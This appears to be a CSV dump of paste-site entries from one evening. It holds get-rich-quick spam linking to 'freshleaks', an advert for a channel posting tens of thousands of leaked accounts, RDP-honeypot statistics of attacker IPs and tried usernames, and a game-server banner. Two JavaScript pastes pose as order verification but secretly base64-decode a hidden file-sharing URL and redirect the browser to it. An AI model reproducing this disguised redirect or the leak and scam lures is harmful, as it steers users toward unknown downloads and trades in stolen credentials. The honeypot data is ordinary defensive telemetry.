id,title,username,language,date,content
cWx4c3sT,EARN $900 INSTANTLY 2025⭐ GV,MOHAMED69_VS,JavaScript,Wednesday 30th of April 2025 07:24:14 PM CDT," 
Pdf https://tinyurl.com/freshleaks

b8dl9rcRzo
"
HgVhJGff,Untitled,WantingTrae,JavaScript,Wednesday 30th of April 2025 07:19:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/32729/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ii4be6j0,Leaked Accounts - Fresh Hits,SpawnKz,JavaScript,Wednesday 30th of April 2025 07:19:03 PM CDT,49143 Accounts Posted On https://t.me/leakzbyeminem
k6Ap3K3h,2025-04-30_stats.json,rdp_snitch,JSON,Wednesday 30th of April 2025 07:18:26 PM CDT,"{
  ""ip"": {
    ""159.89.6.147"": 2025,
    ""80.94.95.198"": 36,
    ""111.89.163.100"": 51,
    ""195.154.56.122"": 3,
    ""71.82.170.60"": 45,
    ""167.94.138.42"": 3,
    ""211.185.207.14"": 30,
    ""205.210.31.150"": 9,
    ""194.187.176.238"": 3,
    ""221.181.44.30"": 9,
    ""80.94.95.90"": 6,
    ""88.214.25.122"": 6,
    ""91.238.181.93"": 6,
    ""185.39.19.53"": 6,
    ""54.204.98.247"": 204,
    ""62.60.188.24"": 6,
    ""180.93.172.74"": 3,
    ""45.117.177.2"": 1488,
    ""194.180.49.123"": 3,
    ""212.147.209.126"": 9,
    ""147.185.132.28"": 9,
    ""160.30.44.131"": 18,
    ""88.214.50.50"": 9,
    ""193.176.22.13"": 18,
    ""205.210.31.77"": 9,
    ""58.218.199.219"": 15,
    ""103.82.133.90"": 18,
    ""71.6.134.230"": 30,
    ""152.32.134.156"": 3,
    ""162.210.245.77"": 6,
    ""147.185.132.195"": 9,
    ""194.165.16.163"": 6,
    ""185.242.226.23"": 3
  },
  ""asn"": {
    ""AS14061"": 2025,
    ""AS204428"": 42,
    ""AS2514"": 51,
    ""AS12876"": 3,
    ""AS20115"": 45,
    ""AS398324"": 3,
    ""AS4766"": 30,
    ""AS396982"": 36,
    ""AS208843"": 3,
    ""AS9808"": 9,
    ""AS35042"": 6,
    ""AS49434"": 6,
    ""AS213021"": 6,
    ""AS14618"": 204,
    ""AS215930"": 6,
    ""AS135944"": 3,
    ""AS131353"": 1488,
    ""AS201814"": 3,
    ""AS50837"": 9,
    ""AS152963"": 18,
    ""Unknown"": 27,
    ""AS4134"": 15,
    ""AS149089"": 18,
    ""AS10439"": 30,
    ""AS135377"": 3,
    ""AS397651"": 6,
    ""AS48721"": 6,
    ""AS202425"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 2025,
    ""SS-Net"": 42,
    ""NTT PC Communications, Inc."": 51,
    ""Online SAS"": 3,
    ""Charter Communications"": 45,
    ""Censys, Inc."": 3,
    ""Korea Telecom"": 30,
    ""Google LLC"": 36,
    ""Alpha Strike Labs GmbH"": 3,
    ""China Mobile communications corporation"": 9,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Datacenter location PAR1 France"": 6,
    ""Prime LLC"": 6,
    ""Amazon.com, Inc."": 204,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 6,
    ""SPT"": 3,
    ""NHANHOA"": 1488,
    ""MEVSPACE sp. z o.o."": 3,
    ""CLOUDSIGMA AG"": 9,
    ""Phuong Nam Company Limited"": 18,
    ""SIA \""Singularity Telecom\"""": 27,
    ""Chinanet"": 15,
    ""Cloudfly Corporation"": 18,
    ""CariNet, Inc."": 30,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""RCI Broadband"": 6,
    ""Flyservers S.A."": 6,
    ""IP Volume inc"": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 2025,
    ""Unmanaged LTD"": 42,
    ""InfoSphere"": 51,
    ""Unknown"": 3,
    ""Spectrum"": 45,
    ""Censys, Inc"": 3,
    ""Kornet"": 30,
    ""Palo Alto Networks, Inc"": 36,
    ""Alpha Strike Labs GmbH"": 3,
    ""China Mobile"": 9,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Prime LLC"": 6,
    ""AWS EC2 (us-east-1)"": 204,
    ""UAB Host Baltic"": 6,
    ""Saigon Postel Corporation"": 3,
    ""Branch of Nhan Hoa Software Company"": 1488,
    ""HostSlick"": 3,
    ""ServeCentric Ltd"": 9,
    ""Phuong Nam Company Limited"": 18,
    ""SIA \""Singularity Telecom\"""": 27,
    ""Chinanet JS"": 15,
    ""Cloudfly Corporation"": 18,
    ""CariNet, Inc."": 30,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""10x Servers"": 6,
    ""Flyservers S.A"": 6,
    ""AI Spera"": 3
  },
  ""regionName"": {
    ""Hesse"": 2025,
    ""Budapest"": 42,
    ""Tokyo"": 51,
    ""\u00cele-de-France"": 9,
    ""Wisconsin"": 45,
    ""Michigan"": 3,
    ""Sejong-si"": 30,
    ""California"": 36,
    ""State of Berlin"": 3,
    ""Guangdong"": 9,
    ""Kowloon City"": 6,
    ""Moscow"": 6,
    ""Virginia"": 210,
    ""Tehran"": 6,
    ""Ho Chi Minh"": 1509,
    ""Bavaria"": 3,
    ""Leinster"": 9,
    ""New York"": 27,
    ""Jiangsu"": 15,
    ""Haryana"": 18,
    ""Nevada"": 30,
    ""Kowloon"": 3,
    ""Kaunas"": 6,
    ""North Holland"": 3
  },
  ""country"": {
    ""Germany"": 2031,
    ""Hungary"": 42,
    ""Japan"": 51,
    ""France"": 9,
    ""United States"": 351,
    ""South Korea"": 30,
    ""China"": 24,
    ""Hong Kong"": 9,
    ""Russia"": 6,
    ""Iran"": 6,
    ""Vietnam"": 1509,
    ""Ireland"": 9,
    ""India"": 18,
    ""Lithuania"": 6,
    ""The Netherlands"": 3
  },
  ""account"": {
    ""hello"": 3798,
    ""142.93.8.59"": 162,
    ""Administr"": 15,
    ""(empty)"": 3,
    ""SuycWhFfc"": 3,
    ""LHXnFE"": 3,
    ""rVFOuo"": 3,
    ""user"": 3,
    ""Test"": 30,
    ""lkAuCCnNl"": 3,
    ""yIZliE"": 3,
    ""wsCuBl"": 3,
    ""Domain"": 21,
    ""IPhzQoqOD"": 3,
    ""OvdaWM"": 3,
    ""mGeXyl"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""Administrator"": 3,
    ""FwmxuXatt"": 3,
    ""wtlMWI"": 3,
    ""xWcAbR"": 3,
    ""nmap"": 3
  },
  ""keyboard"": {
    ""Unknown"": 4104
  },
  ""client_build"": {
    ""Unknown"": 4104
  },
  ""client_name"": {
    ""Unknown"": 4104
  },
  ""ip_type"": {
    ""hosting"": 3804,
    ""Unknown"": 270,
    ""mobile"": 9,
    ""proxy"": 21
  }
}"
eFU6v0g4,Hazbin | HardRP,Sova813,HTML,Wednesday 30th of April 2025 07:16:58 PM CDT,"<align=""center"">
<size=55><color=#8b0000>H<color=#800000>a<color=#800080>z<color=#9400d2>b<color=#8a2ae2>i<color=#9370db>n<color=#ffffff> | <color=#d39bef>H<color=#c882eb>a<color=#bd69e7>r<color=#b250e3>d<color=#a737df> <color=#9c1edb>R<color=#8a2ae2>P</color>
<align=""left"">
<size=18>Hazbin HardRP — <color=#ffffff><size=18>RP Сервер где отыгровка важнее правил, отыгровка максимально приближена к реальности, мы приветствуем свободную отыгровку
Каждый раунд у нас проводится вручную под руководством администрации, раунды с особым сюжетом проводятся с анонсами в нашем дискорде</color>
 
<size=25><link=""https://discord.gg/FVTXFnTjJV""><mark=#2b2b2b><color=#ffffff><size=25>|💾|<size=25><mark=#3b3b3b>  Наш дискорд сервер  |<space=0.1em></mark></link></size>
 
<size=25><link=""https://docs.google.com/document/d/1bAQrYSJkswJ-xDpeiVdCL6h1Z5ZxB9r7tbR37UI_O_w/edit?tab=t.0""><mark=#2b2b2b><color=#ffffff><size=25>|📕|<size=25><mark=#3b3b3b>  Правила|<space=0.1em>|</mark></link></size></align>
<size=0>powered by: nu-forward</size>"
csNe1Z9i,2025-04-30_stats.json,rdp_snitch,JSON,Wednesday 30th of April 2025 07:16:16 PM CDT,"{
  ""ip"": {
    ""159.89.6.147"": 1350,
    ""80.94.95.198"": 24,
    ""111.89.163.100"": 34,
    ""195.154.56.122"": 2,
    ""71.82.170.60"": 30,
    ""167.94.138.42"": 2,
    ""211.185.207.14"": 20,
    ""205.210.31.150"": 6,
    ""194.187.176.238"": 2,
    ""221.181.44.30"": 6,
    ""80.94.95.90"": 4,
    ""88.214.25.122"": 4,
    ""91.238.181.93"": 4,
    ""185.39.19.53"": 4,
    ""54.204.98.247"": 136,
    ""62.60.188.24"": 4,
    ""180.93.172.74"": 2,
    ""45.117.177.2"": 992,
    ""194.180.49.123"": 2,
    ""212.147.209.126"": 6,
    ""147.185.132.28"": 6,
    ""160.30.44.131"": 12,
    ""88.214.50.50"": 6,
    ""193.176.22.13"": 12,
    ""205.210.31.77"": 6,
    ""58.218.199.219"": 10,
    ""103.82.133.90"": 12,
    ""71.6.134.230"": 20,
    ""152.32.134.156"": 2,
    ""162.210.245.77"": 4,
    ""147.185.132.195"": 6,
    ""194.165.16.163"": 4,
    ""185.242.226.23"": 2
  },
  ""asn"": {
    ""AS14061"": 1350,
    ""AS204428"": 28,
    ""AS2514"": 34,
    ""AS12876"": 2,
    ""AS20115"": 30,
    ""AS398324"": 2,
    ""AS4766"": 20,
    ""AS396982"": 24,
    ""AS208843"": 2,
    ""AS9808"": 6,
    ""AS35042"": 4,
    ""AS49434"": 4,
    ""AS213021"": 4,
    ""AS14618"": 136,
    ""AS215930"": 4,
    ""AS135944"": 2,
    ""AS131353"": 992,
    ""AS201814"": 2,
    ""AS50837"": 6,
    ""AS152963"": 12,
    ""Unknown"": 18,
    ""AS4134"": 10,
    ""AS149089"": 12,
    ""AS10439"": 20,
    ""AS135377"": 2,
    ""AS397651"": 4,
    ""AS48721"": 4,
    ""AS202425"": 2
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 1350,
    ""SS-Net"": 28,
    ""NTT PC Communications, Inc."": 34,
    ""Online SAS"": 2,
    ""Charter Communications"": 30,
    ""Censys, Inc."": 2,
    ""Korea Telecom"": 20,
    ""Google LLC"": 24,
    ""Alpha Strike Labs GmbH"": 2,
    ""China Mobile communications corporation"": 6,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""Datacenter location PAR1 France"": 4,
    ""Prime LLC"": 4,
    ""Amazon.com, Inc."": 136,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 4,
    ""SPT"": 2,
    ""NHANHOA"": 992,
    ""MEVSPACE sp. z o.o."": 2,
    ""CLOUDSIGMA AG"": 6,
    ""Phuong Nam Company Limited"": 12,
    ""SIA \""Singularity Telecom\"""": 18,
    ""Chinanet"": 10,
    ""Cloudfly Corporation"": 12,
    ""CariNet, Inc."": 20,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""RCI Broadband"": 4,
    ""Flyservers S.A."": 4,
    ""IP Volume inc"": 2
  },
  ""org"": {
    ""DigitalOcean, LLC"": 1350,
    ""Unmanaged LTD"": 28,
    ""InfoSphere"": 34,
    ""Unknown"": 2,
    ""Spectrum"": 30,
    ""Censys, Inc"": 2,
    ""Kornet"": 20,
    ""Palo Alto Networks, Inc"": 24,
    ""Alpha Strike Labs GmbH"": 2,
    ""China Mobile"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""Prime LLC"": 4,
    ""AWS EC2 (us-east-1)"": 136,
    ""UAB Host Baltic"": 4,
    ""Saigon Postel Corporation"": 2,
    ""Branch of Nhan Hoa Software Company"": 992,
    ""HostSlick"": 2,
    ""ServeCentric Ltd"": 6,
    ""Phuong Nam Company Limited"": 12,
    ""SIA \""Singularity Telecom\"""": 18,
    ""Chinanet JS"": 10,
    ""Cloudfly Corporation"": 12,
    ""CariNet, Inc."": 20,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""10x Servers"": 4,
    ""Flyservers S.A"": 4,
    ""AI Spera"": 2
  },
  ""regionName"": {
    ""Hesse"": 1350,
    ""Budapest"": 28,
    ""Tokyo"": 34,
    ""\u00cele-de-France"": 6,
    ""Wisconsin"": 30,
    ""Michigan"": 2,
    ""Sejong-si"": 20,
    ""California"": 24,
    ""State of Berlin"": 2,
    ""Guangdong"": 6,
    ""Kowloon City"": 4,
    ""Moscow"": 4,
    ""Virginia"": 140,
    ""Tehran"": 4,
    ""Ho Chi Minh"": 1006,
    ""Bavaria"": 2,
    ""Leinster"": 6,
    ""New York"": 18,
    ""Jiangsu"": 10,
    ""Haryana"": 12,
    ""Nevada"": 20,
    ""Kowloon"": 2,
    ""Kaunas"": 4,
    ""North Holland"": 2
  },
  ""country"": {
    ""Germany"": 1354,
    ""Hungary"": 28,
    ""Japan"": 34,
    ""France"": 6,
    ""United States"": 234,
    ""South Korea"": 20,
    ""China"": 16,
    ""Hong Kong"": 6,
    ""Russia"": 4,
    ""Iran"": 4,
    ""Vietnam"": 1006,
    ""Ireland"": 6,
    ""India"": 12,
    ""Lithuania"": 4,
    ""The Netherlands"": 2
  },
  ""account"": {
    ""hello"": 2532,
    ""142.93.8.59"": 108,
    ""Administr"": 10,
    ""(empty)"": 2,
    ""SuycWhFfc"": 2,
    ""LHXnFE"": 2,
    ""rVFOuo"": 2,
    ""user"": 2,
    ""Test"": 20,
    ""lkAuCCnNl"": 2,
    ""yIZliE"": 2,
    ""wsCuBl"": 2,
    ""Domain"": 14,
    ""IPhzQoqOD"": 2,
    ""OvdaWM"": 2,
    ""mGeXyl"": 2,
    ""eltons"": 10,
    ""administr"": 10,
    ""Administrator"": 2,
    ""FwmxuXatt"": 2,
    ""wtlMWI"": 2,
    ""xWcAbR"": 2,
    ""nmap"": 2
  },
  ""keyboard"": {
    ""Unknown"": 2736
  },
  ""client_build"": {
    ""Unknown"": 2736
  },
  ""client_name"": {
    ""Unknown"": 2736
  },
  ""ip_type"": {
    ""hosting"": 2536,
    ""Unknown"": 180,
    ""mobile"": 6,
    ""proxy"": 14
  }
}"
GbgSEW66,2025-04-30_stats.json,rdp_snitch,JSON,Wednesday 30th of April 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""159.89.6.147"": 675,
    ""80.94.95.198"": 12,
    ""111.89.163.100"": 17,
    ""195.154.56.122"": 1,
    ""71.82.170.60"": 15,
    ""167.94.138.42"": 1,
    ""211.185.207.14"": 10,
    ""205.210.31.150"": 3,
    ""194.187.176.238"": 1,
    ""221.181.44.30"": 3,
    ""80.94.95.90"": 2,
    ""88.214.25.122"": 2,
    ""91.238.181.93"": 2,
    ""185.39.19.53"": 2,
    ""54.204.98.247"": 68,
    ""62.60.188.24"": 2,
    ""180.93.172.74"": 1,
    ""45.117.177.2"": 496,
    ""194.180.49.123"": 1,
    ""212.147.209.126"": 3,
    ""147.185.132.28"": 3,
    ""160.30.44.131"": 6,
    ""88.214.50.50"": 3,
    ""193.176.22.13"": 6,
    ""205.210.31.77"": 3,
    ""58.218.199.219"": 5,
    ""103.82.133.90"": 6,
    ""71.6.134.230"": 10,
    ""152.32.134.156"": 1,
    ""162.210.245.77"": 2,
    ""147.185.132.195"": 3,
    ""194.165.16.163"": 2,
    ""185.242.226.23"": 1
  },
  ""asn"": {
    ""AS14061"": 675,
    ""AS204428"": 14,
    ""AS2514"": 17,
    ""AS12876"": 1,
    ""AS20115"": 15,
    ""AS398324"": 1,
    ""AS4766"": 10,
    ""AS396982"": 12,
    ""AS208843"": 1,
    ""AS9808"": 3,
    ""AS35042"": 2,
    ""AS49434"": 2,
    ""AS213021"": 2,
    ""AS14618"": 68,
    ""AS215930"": 2,
    ""AS135944"": 1,
    ""AS131353"": 496,
    ""AS201814"": 1,
    ""AS50837"": 3,
    ""AS152963"": 6,
    ""Unknown"": 9,
    ""AS4134"": 5,
    ""AS149089"": 6,
    ""AS10439"": 10,
    ""AS135377"": 1,
    ""AS397651"": 2,
    ""AS48721"": 2,
    ""AS202425"": 1
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 675,
    ""SS-Net"": 14,
    ""NTT PC Communications, Inc."": 17,
    ""Online SAS"": 1,
    ""Charter Communications"": 15,
    ""Censys, Inc."": 1,
    ""Korea Telecom"": 10,
    ""Google LLC"": 12,
    ""Alpha Strike Labs GmbH"": 1,
    ""China Mobile communications corporation"": 3,
    ""NOC EMAIL: noc@one-host.net"": 2,
    ""Datacenter location PAR1 France"": 2,
    ""Prime LLC"": 2,
    ""Amazon.com, Inc."": 68,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 2,
    ""SPT"": 1,
    ""NHANHOA"": 496,
    ""MEVSPACE sp. z o.o."": 1,
    ""CLOUDSIGMA AG"": 3,
    ""Phuong Nam Company Limited"": 6,
    ""SIA \""Singularity Telecom\"""": 9,
    ""Chinanet"": 5,
    ""Cloudfly Corporation"": 6,
    ""CariNet, Inc."": 10,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""RCI Broadband"": 2,
    ""Flyservers S.A."": 2,
    ""IP Volume inc"": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 675,
    ""Unmanaged LTD"": 14,
    ""InfoSphere"": 17,
    ""Unknown"": 1,
    ""Spectrum"": 15,
    ""Censys, Inc"": 1,
    ""Kornet"": 10,
    ""Palo Alto Networks, Inc"": 12,
    ""Alpha Strike Labs GmbH"": 1,
    ""China Mobile"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Prime LLC"": 2,
    ""AWS EC2 (us-east-1)"": 68,
    ""UAB Host Baltic"": 2,
    ""Saigon Postel Corporation"": 1,
    ""Branch of Nhan Hoa Software Company"": 496,
    ""HostSlick"": 1,
    ""ServeCentric Ltd"": 3,
    ""Phuong Nam Company Limited"": 6,
    ""SIA \""Singularity Telecom\"""": 9,
    ""Chinanet JS"": 5,
    ""Cloudfly Corporation"": 6,
    ""CariNet, Inc."": 10,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""10x Servers"": 2,
    ""Flyservers S.A"": 2,
    ""AI Spera"": 1
  },
  ""regionName"": {
    ""Hesse"": 675,
    ""Budapest"": 14,
    ""Tokyo"": 17,
    ""\u00cele-de-France"": 3,
    ""Wisconsin"": 15,
    ""Michigan"": 1,
    ""Sejong-si"": 10,
    ""California"": 12,
    ""State of Berlin"": 1,
    ""Guangdong"": 3,
    ""Kowloon City"": 2,
    ""Moscow"": 2,
    ""Virginia"": 70,
    ""Tehran"": 2,
    ""Ho Chi Minh"": 503,
    ""Bavaria"": 1,
    ""Leinster"": 3,
    ""New York"": 9,
    ""Jiangsu"": 5,
    ""Haryana"": 6,
    ""Nevada"": 10,
    ""Kowloon"": 1,
    ""Kaunas"": 2,
    ""North Holland"": 1
  },
  ""country"": {
    ""Germany"": 677,
    ""Hungary"": 14,
    ""Japan"": 17,
    ""France"": 3,
    ""United States"": 117,
    ""South Korea"": 10,
    ""China"": 8,
    ""Hong Kong"": 3,
    ""Russia"": 2,
    ""Iran"": 2,
    ""Vietnam"": 503,
    ""Ireland"": 3,
    ""India"": 6,
    ""Lithuania"": 2,
    ""The Netherlands"": 1
  },
  ""account"": {
    ""hello"": 1266,
    ""142.93.8.59"": 54,
    ""Administr"": 5,
    ""(empty)"": 1,
    ""SuycWhFfc"": 1,
    ""LHXnFE"": 1,
    ""rVFOuo"": 1,
    ""user"": 1,
    ""Test"": 10,
    ""lkAuCCnNl"": 1,
    ""yIZliE"": 1,
    ""wsCuBl"": 1,
    ""Domain"": 7,
    ""IPhzQoqOD"": 1,
    ""OvdaWM"": 1,
    ""mGeXyl"": 1,
    ""eltons"": 5,
    ""administr"": 5,
    ""Administrator"": 1,
    ""FwmxuXatt"": 1,
    ""wtlMWI"": 1,
    ""xWcAbR"": 1,
    ""nmap"": 1
  },
  ""keyboard"": {
    ""Unknown"": 1368
  },
  ""client_build"": {
    ""Unknown"": 1368
  },
  ""client_name"": {
    ""Unknown"": 1368
  },
  ""ip_type"": {
    ""hosting"": 1268,
    ""Unknown"": 90,
    ""mobile"": 3,
    ""proxy"": 7
  }
}"
HcPZV95u,Make $1000 15-MINUTES  (BEGINNER) YR,MOHAMED69_VS,JavaScript,Wednesday 30th of April 2025 07:15:00 PM CDT," 
Pdf https://tinyurl.com/freshleaks

QqlQkZmtMV
"
MZ6aFwSw,EARN $900 INSTANTLY 2025 95,MOHAMED69_VS,JavaScript,Wednesday 30th of April 2025 07:05:47 PM CDT," 
Pdf https://tinyurl.com/freshleaks

PZlI9WRjv4
"
kFAQww2k,Products.js,WantingTrae,JavaScript,Wednesday 30th of April 2025 07:03:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45722/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
